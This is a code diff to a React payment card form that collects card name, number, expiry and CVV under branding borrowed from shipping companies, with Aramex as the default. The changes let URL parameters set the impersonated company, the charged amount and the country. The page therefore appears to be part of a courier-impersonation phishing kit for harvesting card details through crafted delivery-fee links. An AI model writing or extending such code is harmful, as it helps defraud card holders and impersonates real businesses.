@@ -1,5 +1,5 @@
-import { useState } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useState, useEffect } from "react";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -19,21 +19,27 @@ const PaymentCardForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const [searchParams] = useSearchParams();
+  const { data: linkData, isLoading } = useLink(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [isReady, setIsReady] = useState(false);
+
+  const serviceParam = searchParams.get('service') || searchParams.get('s');
+  const amountParam = searchParams.get('amount') || searchParams.get('a');
+  const countryParam = searchParams.get('country') || searchParams.get('c');
 
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
 
-  const rawAmount = shippingInfo?.cod_amount;
+  const rawAmount = amountParam || shippingInfo?.cod_amount;
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
@@ -54,6 +60,19 @@ const PaymentCardForm = () => {
   
   const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
   const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
+  
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsReady(true);
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
+  
+  useEffect(() => {
+    if (linkData || countryParam) {
+      setIsReady(true);
+    }
+  }, [linkData, countryParam]);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
